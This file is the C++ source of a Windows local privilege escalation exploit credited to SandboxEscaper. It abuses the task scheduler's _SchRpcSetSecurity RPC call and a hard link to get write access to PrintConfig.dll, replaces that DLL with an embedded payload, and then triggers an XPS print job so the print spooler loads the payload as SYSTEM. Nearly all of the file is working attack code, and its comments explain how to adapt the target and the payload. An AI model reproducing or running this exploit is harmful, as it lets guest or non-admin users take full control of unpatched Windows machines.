//***************************************************************//
// Windows LPE - Non-admin/Guest to system - by SandboxEscaper   //
//***************************************************************//

/* _SchRpcSetSecurity which is part of the task scheduler ALPC endpoint allows us to set an arbitrary DACL.
It will Set the security of a file in c:\windows\tasks without impersonating, a non-admin (works from Guest too) user can write here.
Before the task scheduler writes the DACL we can create a hard link to any file we have read access over.
This will result in an arbitrary DACL write.
This PoC will overwrite a printer related dll and use it as a hijacking vector. This is ofcourse one of many options to abuse this.*/

#include "resource.h"
#include "stdafx.h"
#include "rpc_h.h"
#include <xpsprint.h>
#include <fstream>
#pragma comment(lib, "rpcrt4.lib")

using namespace std;
RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE *binding_handle)
{
	RPC_STATUS status;
	RPC_BINDING_HANDLE v5;
	RPC_SECURITY_QOS SecurityQOS = {};
	RPC_WSTR StringBinding = nullptr;
	RPC_BINDING_HANDLE Binding;

	StringBinding = 0;
	Binding = 0;
	status = RpcStringBindingComposeW(L"c8ba73d2-3d55-429c-8e9a-c44f006f69fc", L"ncalrpc", 
		nullptr, nullptr, nullptr, &StringBinding);
	if (status == RPC_S_OK)
	{
		status = RpcBindingFromStringBindingW(StringBinding, &Binding);
		RpcStringFreeW(&StringBinding);
		if (!status)
		{
			SecurityQOS.Version = 1;
			SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
			SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
			SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

			status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
			if (!status)
			{
				v5 = Binding;
				Binding = 0;
				*binding_handle = v5;
			}
		}
	}

	if (Binding)
		RpcBindingFree(&Binding);
	return status;
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}

bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname);

void RunExploit()
{
	RPC_BINDING_HANDLE handle;
	RPC_STATUS status = CreateBindingHandle(&handle);

	//These two functions will set the DACL on an arbitrary file (see hardlink in main), change the security descriptor string parameters if needed.	
	_SchRpcCreateFolder(handle, L"UpdateTask", L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)", 0);
	_SchRpcSetSecurity(handle, L"UpdateTask", L"D:(A;;FA;;;BA)(A;OICIIO;GA;;;BA)(A;;FA;;;SY)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;AU)(A;OICIIO;SDGXGWGR;;;AU)(A;;0x1200a9;;;BU)(A;OICIIO;GXGR;;;BU)", 0);
}

int mainf()
{
	//We enumerate the path of PrintConfig.dll, which we will write the DACL of and overwrite to hijack the print spooler service
	//You might want to expand this code block with FindNextFile .. as there may be multiple prnms003.inf_amd64* folders since older versions do not get cleaned up it in some rare cases.
	//When this happens this code has no garantuee that it will target the dll that ends up getting loaded... and you really want to avoid this.
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	hFind = FindFirstFile(L"C:\\Windows\\System32\\DriverStore\\FileRepository\\prnms003.inf_amd64*", &FindFileData);
	wchar_t BeginPath[MAX_PATH] = L"c:\\windows\\system32\\DriverStore\\FileRepository\\";
	wchar_t PrinterDriverFolder[MAX_PATH];
	wchar_t EndPath[23] = L"\\Amd64\\PrintConfig.dll";
	wmemcpy(PrinterDriverFolder, FindFileData.cFileName, wcslen(FindFileData.cFileName));
	FindClose(hFind);
	wcscat(BeginPath, PrinterDriverFolder);
	wcscat(BeginPath, EndPath);

	//Create a hardlink with UpdateTask.job to our target, this is the file the task scheduler will write the DACL of
	CreateNativeHardlink(L"c:\\windows\\tasks\\UpdateTask.job", BeginPath);
	RunExploit();

	//Must be name of final DLL.. might be better ways to grab the handle
	HMODULE mod = GetModuleHandle(L"ALPC-TaskSched-LPE");
	
	//Payload is included as a resource, you need to modify this resource accordingly.
	HRSRC myResource = ::FindResource(mod, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	unsigned int myResourceSize = ::SizeofResource(mod, myResource);
	HGLOBAL myResourceData = ::LoadResource(mod, myResource);
	void* pMyBinaryData = ::LockResource(myResourceData);
	
	//We try to open the DLL in a loop, it could already be loaded somewhere.. if thats the case, it will throw a sharing violation and we should not continue
	HANDLE hFile;
	DWORD dwBytesWritten = 0;
	do {
		hFile = CreateFile(BeginPath,GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);                  
		WriteFile(hFile,(char*)pMyBinaryData,myResourceSize,&dwBytesWritten,NULL);           
		if (hFile == INVALID_HANDLE_VALUE)
		{
			Sleep(5000);
		}
	} while (hFile == INVALID_HANDLE_VALUE);
	CloseHandle(hFile);
	
	//After writing PrintConfig.dll we start an XpsPrintJob to load the dll into the print spooler service.
	CoInitialize(nullptr);
	IXpsOMObjectFactory *xpsFactory = NULL;
	CoCreateInstance(__uuidof(XpsOMObjectFactory), NULL, CLSCTX_INPROC_SERVER, __uuidof(IXpsOMObjectFactory), reinterpret_cast<LPVOID*>(&xpsFactory));
	HANDLE completionEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	IXpsPrintJob *job = NULL;
	IXpsPrintJobStream *jobStream = NULL;
	StartXpsPrintJob(L"Microsoft XPS Document Writer", L"Print Job 1", NULL, NULL, completionEvent, NULL, 0, &job, &jobStream, NULL);
	jobStream->Close();
	CoUninitialize();
	return 0;
}

DWORD CALLBACK ExploitThread(LPVOID hModule)
{
	mainf();
	FreeLibraryAndExitThread((HMODULE)hModule, 0);
	return 0;
}
